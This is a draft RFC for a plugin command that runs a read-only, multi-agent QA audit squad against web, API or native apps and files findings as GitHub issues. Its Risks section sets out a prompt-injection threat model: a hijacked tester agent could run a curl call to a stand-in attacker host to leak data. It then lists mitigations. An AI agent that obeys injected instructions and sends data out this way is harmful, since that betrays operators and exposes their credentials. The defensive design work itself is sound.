# RFC 0006: /uberdev:testers — Adversarial Multi-Persona QA Audit Squad

**Status:** Draft
**Author:** flackplay (TheFJK)
**Targets:** uberdev plugin v0.30+
**Tier:** medium-large (1 command + 1 skill + 8 agents + fixture + tests)
**Spec:** `docs/uberdev/specs/2026-05-21-testers-command-design.md`

## Summary

A new slash command `/uberdev:testers` that spawns an 8-agent read-only QA audit squad (6 distinct-persona testers + 2 monitor agents) across 3 coordinated waves against an auto-detected target (web / api / native / all). Findings are evidence-anchored against a 10-invariant oracle library and filed as GitHub issues via the existing `findings-to-issues` pipeline.

## Motivation

uberdev has static reviewers (`pr-test-analyzer`, `silent-failure-hunter`) but no command that exercises the running app like a real user. Research (full notes in the spec) shows multi-persona diversity beats single-agent self-critique, and that 7 documented LLM-tester failure modes (optimistic-pass, hallucinated bugs, silent failure, cascading hallucination, loop traps, sycophancy, shared-session pollution) demand a structured defense — invariant-based oracles, evidence anchors, and a separate-prompt critic. This RFC implements that defense as a first-class command.

## Design

See spec for the full design. Key choices, locked from brainstorm:

- Auto-detect target surface (web/api/native/all)
- Local report + auto-file GitHub issues via `findings-to-issues`
- Unattended via dispatch backend (claude-bg/wezterm/background per RFC 0004); `--watch` flag runs inline
- 6 personas + 2 monitors = 8 agents per wave; 3 waves per run = 24 agent dispatches per run
- Wave-based monitor → persona communication (monitor reads previous wave, generates per-persona follow-ups)
- **Read-only audit** — no agent has `Edit` or general `Write` on app code; `allowed-tools` whitelisted per agent
- No early-stop; all personas run to budget (`max_actions: 200`, `max_clock_seconds: 300` per persona-wave)

## Alternatives considered

- In-session waves only (no backgrounding) — rejected; occupies session 15–30min.
- Live shared-findings-file polling — rejected; Claude subagents don't poll reliably mid-run.
- Cascading monitor-as-orchestrator — rejected; debug surface explodes.
- 2-persona lean squad — rejected per user's maximalist choice.
- Auto-fix mode — rejected; squad is intentionally read-only.

## Migration

None. New command, no breaking changes. Add `/testers` alias to `aliases-sync.sh` array (one new row).

## Risks

- **Cost:** 24 agent dispatches per run, monitor-primary on Opus. Mitigation: existing `fanout_concurrency` envvar pattern; cap per-wave fan-out via `UBERDEV_TESTERS_FANOUT` (default 8, matching wave size).
- **Prod blast radius:** an unconstrained run against a prod URL would hammer it. Mitigation: `prod_url_patterns` refusal in `.uberdev/config.yaml`, `--rps-cap=10` default for API.
- **Hallucinated bugs:** see spec section 8; defenses are evidence-anchor requirement + invariant_violated requirement + cross-persona confirmation.
- **Egress / prompt-injection exfil:** the 6 persona agents allow `Bash(curl*)` so they can replay requests, probe headers, and follow redirects against arbitrary audit targets (localhost, staging, user-supplied URLs). A hijacked prompt could in principle invoke `curl https://attacker.example/?leak=...`. Mitigations: (a) the audit target is supplied by the operator on a deliberate `/uberdev:testers` invocation — not auto-triggered; (b) `--rps-cap` and `max_clock_seconds: 300` per persona-wave limit the exfil bandwidth; (c) the read-only contract (no `Edit`, scoped `Write(.uberdev/research/*)`) means an injected prompt cannot pivot to credential theft from the repo; (d) operators auditing third-party prompts should run the squad in a sandboxed shell with no `~/.aws`, `~/.ssh`, or `~/.config/gh` access on the user the agent runs as.

## Integration

- Reuses `lib/dispatch.sh` (RFC 0004), `findings-to-issues` agent, reviewer YAML contract, `.uberdev/research/$RUN_ID/` artifact convention.
- New: one command file, one skill, eight agent files, one buggy-app fixture, two test files.
- **Runtime dep:** PyYAML (`pip install pyyaml`). `aggregate.py` and `report.py` import `yaml`; Phase 0 of `SKILL.md` runs a `python3 -c "import yaml"` precheck and exits 2 with a clear stderr line if missing. PyYAML is already pulled in transitively by most Python toolchains; the precheck only fires on a stripped python3.
